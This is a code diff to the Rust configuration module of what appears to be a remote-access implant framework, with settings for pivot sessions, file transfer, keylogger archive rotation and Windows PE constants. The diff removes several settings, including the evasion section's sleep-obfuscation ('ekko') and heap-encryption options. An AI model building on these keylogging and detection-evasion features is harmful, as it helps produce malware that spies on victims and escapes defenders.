@@ -60,16 +60,12 @@ pub struct ServerConfig {
     pub registration_hmac_window_secs: i64,
     /// Prune the replay-cache once it grows past this many seen HMACs.
     pub seen_hmac_prune_threshold: usize,
-    /// Times a poisoned lock is recovered before the component gives up.
-    pub max_poison_recoveries: u32,
     /// Max virtual (pivot child) sessions per parent session.
     pub max_virtual_sessions: usize,
     /// Directory containing agent extensions (.rhai scripts).
     pub extensions_dir: String,
     /// Directory containing server-side modules (.rhai scripts).
     pub modules_dir: String,
-    /// First fallback session id used when the database sequence is unavailable.
-    pub session_fallback_id_start: u32,
 }
 
 impl Default for ServerConfig {
@@ -87,11 +83,9 @@ impl Default for ServerConfig {
             audit_operator_password_len: 24,
             registration_hmac_window_secs: 300,
             seen_hmac_prune_threshold: 1000,
-            max_poison_recoveries: 3,
             max_virtual_sessions: 64,
             extensions_dir: "./extensions".to_string(),
             modules_dir: "./modules".to_string(),
-            session_fallback_id_start: 50000,
         }
     }
 }
@@ -127,8 +121,6 @@ pub struct TransferConfig {
     pub zip_chunk_bytes: usize,
     /// Hard cap for one transport frame after wrapping (bytes).
     pub max_frame_bytes: u64,
-    /// Log a warning above this transport frame size (bytes).
-    pub frame_warn_bytes: u64,
     /// Pace between chunks on the single-file download path (milliseconds).
     pub download_chunk_sleep_ms: u64,
 }
@@ -147,7 +139,6 @@ impl Default for TransferConfig {
             zip_channel_chunks: 32,
             zip_chunk_bytes: 65_536,
             max_frame_bytes: 10 * 1024 * 1024,
-            frame_warn_bytes: 2 * 1024 * 1024,
             download_chunk_sleep_ms: 50,
         }
     }
@@ -278,25 +269,11 @@ impl Default for AgentConfig {
 
 // ── Evasion ─────────────────────────────────────────────────────────────────
 
-/// Sleep-obfuscation and heap-encryption tuning.
-#[derive(Debug, Clone, PartialEq)]
+/// Evasion configuration namespace retained for forward compatibility.
+#[derive(Debug, Clone, PartialEq, Default)]
 #[cfg_attr(not(agent_build), derive(Deserialize))]
 #[cfg_attr(not(agent_build), serde(default))]
-pub struct EvasionConfig {
-    /// Allocation block size assumed when walking/encrypting heap blocks.
-    pub heap_block_size: usize,
-    /// Sleep obfuscation technique: "ekko", "spoofed-stack" or "plain".
-    pub sleep_obfuscation: String,
-}
-
-impl Default for EvasionConfig {
-    fn default() -> Self {
-        Self {
-            heap_block_size: 4096,
-            sleep_obfuscation: "ekko".to_string(),
-        }
-    }
-}
+pub struct EvasionConfig {}
 
 // ── Windows FFI constants ───────────────────────────────────────────────────
 
@@ -558,11 +535,9 @@ session_command_channel = {session_command_channel} # capacity of the per-sessio
 audit_operator_password_len = {audit_operator_password_len} # length of the generated initial operator password (characters)
 registration_hmac_window_secs = {registration_hmac_window_secs} # freshness window for registration HMAC timestamps (seconds, both ways)
 seen_hmac_prune_threshold = {seen_hmac_prune_threshold} # prune the replay-cache once it grows past this many seen HMACs
-max_poison_recoveries = {max_poison_recoveries} # times a poisoned lock is recovered before the component gives up
 max_virtual_sessions = {max_virtual_sessions} # max virtual (pivot child) sessions per parent session
 extensions_dir = "{extensions_dir}" # directory containing agent extensions (.rhai scripts)
 modules_dir = "{modules_dir}" # directory containing server-side modules (.rhai scripts)
-session_fallback_id_start = {session_fallback_id_start} # first fallback session id used when the database sequence is unavailable
 
 [transfer]
 max_file_size_bytes = {max_file_size_bytes} # max size of a single transferred file (bytes)
@@ -576,7 +551,6 @@ files_per_yield = {files_per_yield} # yield to the async runtime every N files d
 zip_channel_chunks = {zip_channel_chunks} # bounded-channel capacity (chunks) for streaming zip responses
 zip_chunk_bytes = {zip_chunk_bytes} # chunk size batched onto the streaming-zip channel (bytes)
 max_frame_bytes = {max_frame_bytes} # hard cap for one transport frame after wrapping (bytes)
-frame_warn_bytes = {frame_warn_bytes} # log a warning above this transport frame size (bytes)
 download_chunk_sleep_ms = {download_chunk_sleep_ms} # pace between chunks on the single-file download path (milliseconds)
 
 [rcm]
@@ -609,10 +583,6 @@ http_reader_grace_secs = {http_reader_grace_secs} # grace period for response re
 http_max_response_bytes = {http_max_response_bytes} # maximum buffered size of a single HTTP response (bytes)
 keylogger_max_bytes = {keylogger_max_bytes} # rotate keylogger archives above this size (bytes)
 keylogger_max_age_secs = {keylogger_max_age_secs} # rotate keylogger archives older than this (seconds)
-
-[evasion]
-heap_block_size = {heap_block_size} # allocation block size assumed when walking/encrypting heap blocks
-sleep_obfuscation = "{sleep_obfuscation}" # sleep obfuscation technique: ekko, spoofed-stack or plain
 
 [ffi_windows]
 image_nt_signature = {image_nt_signature} # IMAGE_NT_SIGNATURE ("PE\0\0") validating a PE header
@@ -648,11 +618,9 @@ file_hash_algorithms = [{algos}] # hashes computed for collected-file integrity 
         audit_operator_password_len = c.server.audit_operator_password_len,
         registration_hmac_window_secs = c.server.registration_hmac_window_secs,
         seen_hmac_prune_threshold = c.server.seen_hmac_prune_threshold,
-        max_poison_recoveries = c.server.max_poison_recoveries,
         max_virtual_sessions = c.server.max_virtual_sessions,
         extensions_dir = c.server.extensions_dir,
         modules_dir = c.server.modules_dir,
-        session_fallback_id_start = c.server.session_fallback_id_start,
         max_file_size_bytes = c.transfer.max_file_size_bytes,
         max_total_file_size_bytes = c.transfer.max_total_file_size_bytes,
         max_chunk_b64_bytes = c.transfer.max_chunk_b64_bytes,
@@ -664,7 +632,6 @@ file_hash_algorithms = [{algos}] # hashes computed for collected-file integrity 
         zip_channel_chunks = c.transfer.zip_channel_chunks,
         zip_chunk_bytes = c.transfer.zip_chunk_bytes,
         max_frame_bytes = c.transfer.max_frame_bytes,
-        frame_warn_bytes = c.transfer.frame_warn_bytes,
         download_chunk_sleep_ms = c.transfer.download_chunk_sleep_ms,
         storage_base = c.rcm.storage_base,
         tool_name = c.rcm.tool_name,
@@ -691,8 +658,6 @@ file_hash_algorithms = [{algos}] # hashes computed for collected-file integrity 
         http_max_response_bytes = c.agent.http_max_response_bytes,
         keylogger_max_bytes = c.agent.keylogger_max_bytes,
         keylogger_max_age_secs = c.agent.keylogger_max_age_secs,
-        heap_block_size = c.evasion.heap_block_size,
-        sleep_obfuscation = c.evasion.sleep_obfuscation,
         image_nt_signature = c.ffi_windows.image_nt_signature,
         image_directory_entry_import = c.ffi_windows.image_directory_entry_import,
         mem_commit = c.ffi_windows.mem_commit,
